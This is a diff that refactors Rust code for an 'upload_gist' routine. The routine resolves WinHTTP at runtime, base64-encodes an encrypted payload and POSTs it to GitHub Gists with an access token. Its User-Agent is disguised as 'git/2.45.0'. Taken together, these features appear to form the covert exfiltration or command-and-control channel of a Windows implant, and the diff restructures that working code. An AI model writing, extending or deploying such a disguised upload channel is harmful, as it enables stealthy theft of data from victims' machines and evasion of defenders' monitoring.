@@ -163,6 +163,38 @@ pub unsafe fn upload_gist(
 ) -> Result<GistResult, &'static str> {
     let fns = resolve_winhttp().ok_or("WinHTTP unresolved")?;
 
+    let mut body = upload_gist_build_body(encrypted_payload);
+
+    // WinHTTP session
+    let (req, conn, session) = upload_gist_open(&fns)?;
+
+    // Headers
+    upload_gist_add_headers(&fns, req, pat_token);
+
+    // Send
+    upload_gist_send(&fns, req, conn, session, &mut body)?;
+
+    // Receive
+    upload_gist_receive(&fns, req, conn, session)?;
+
+    // Read response
+    let (resp, total) = upload_gist_read_response(&fns, req);
+
+    // Extract gist ID from JSON: "id":"<hex>"
+    let gist_id = match upload_gist_extract_id(&resp[..total as usize]) {
+        Ok(id) => id,
+        Err(e) => {
+            upload_gist_close_all(&fns, req, conn, session);
+            return Err(e);
+        }
+    };
+
+    upload_gist_close_all(&fns, req, conn, session);
+    Ok(GistResult { gist_id })
+}
+
+/// Base64 encode the payload and wrap it in the Gist JSON body.
+fn upload_gist_build_body(encrypted_payload: &[u8]) -> crate::heap::Vec<u8> {
     // Base64 encode the payload
     let mut b64_buf = [0u8; 16384];
     let b64_len = base64_encode(encrypted_payload, &mut b64_buf);
@@ -174,7 +206,14 @@ pub unsafe fn upload_gist(
     body.extend_from_slice(json_prefix);
     body.extend_from_slice(&b64_buf[..b64_len]);
     body.extend_from_slice(json_suffix);
+    body
+}
 
+/// Open the WinHTTP session, connect and create the POST request. Cleans up
+/// handles opened so far when a later step fails.
+unsafe fn upload_gist_open(
+    fns: &WinHttpFns,
+) -> Result<(*mut c_void, *mut c_void, *mut c_void), &'static str> {
     // WinHTTP session
     let ua = to_utf16(b"git/2.45.0");
     let session = (fns.open)(
@@ -211,7 +250,11 @@ pub unsafe fn upload_gist(
         (fns.close)(session);
         return Err("WinHttpOpenRequest failed");
     }
+    Ok((req, conn, session))
+}
 
+/// Add Authorization + Content-Type headers.
+unsafe fn upload_gist_add_headers(fns: &WinHttpFns, req: *mut c_void, pat_token: &str) {
     // Headers
     let auth = {
         let mut s = to_utf16(b"Authorization: token ");
@@ -224,7 +267,16 @@ pub unsafe fn upload_gist(
     let ct = to_utf16(b"Content-Type: application/json\r\nUser-Agent: git/2.45.0");
     (fns.add_headers)(req, auth.as_ptr(), auth.len() as u32 - 1, 0);
     (fns.add_headers)(req, ct.as_ptr(), ct.len() as u32 - 1, 0);
+}
 
+/// Send the request body; closes all handles on failure.
+unsafe fn upload_gist_send(
+    fns: &WinHttpFns,
+    req: *mut c_void,
+    conn: *mut c_void,
+    session: *mut c_void,
+    body: &mut crate::heap::Vec<u8>,
+) -> Result<(), &'static str> {
     // Send
     if (fns.send)(
         req,
@@ -236,20 +288,29 @@ pub unsafe fn upload_gist(
         0,
     ) == 0
     {
-        (fns.close)(req);
-        (fns.close)(conn);
-        (fns.close)(session);
+        upload_gist_close_all(fns, req, conn, session);
         return Err("WinHttpSendRequest failed");
     }
+    Ok(())
+}
 
+/// Receive the response; closes all handles on failure.
+unsafe fn upload_gist_receive(
+    fns: &WinHttpFns,
+    req: *mut c_void,
+    conn: *mut c_void,
+    session: *mut c_void,
+) -> Result<(), &'static str> {
     // Receive
     if (fns.receive)(req, core::ptr::null_mut()) == 0 {
-        (fns.close)(req);
-        (fns.close)(conn);
-        (fns.close)(session);
+        upload_gist_close_all(fns, req, conn, session);
         return Err("WinHttpReceiveResponse failed");
     }
+    Ok(())
+}
 
+/// Read the response body into a fixed buffer.
+unsafe fn upload_gist_read_response(fns: &WinHttpFns, req: *mut c_void) -> ([u8; 4096], u32) {
     // Read response
     let mut resp = [0u8; 4096];
     let mut total: u32 = 0;
@@ -271,18 +332,26 @@ pub unsafe fn upload_gist(
         }
         total += read;
     }
+    (resp, total)
+}
 
-    // Extract gist ID from JSON: "id":"<hex>"
+/// Extract the gist ID from the JSON response body.
+fn upload_gist_extract_id(resp: &[u8]) -> Result<[u8; 32], &'static str> {
     let mut gist_id = [0u8; 32];
-    if !json_extract_str(&resp[..total as usize], b"id", &mut gist_id) {
-        (fns.close)(req);
-        (fns.close)(conn);
-        (fns.close)(session);
+    if !json_extract_str(resp, b"id", &mut gist_id) {
         return Err("Gist ID not found in response");
     }
+    Ok(gist_id)
+}
 
+/// Close request, connection and session handles.
+unsafe fn upload_gist_close_all(
+    fns: &WinHttpFns,
+    req: *mut c_void,
+    conn: *mut c_void,
+    session: *mut c_void,
+) {
     (fns.close)(req);
     (fns.close)(conn);
     (fns.close)(session);
-    Ok(GistResult { gist_id })
 }
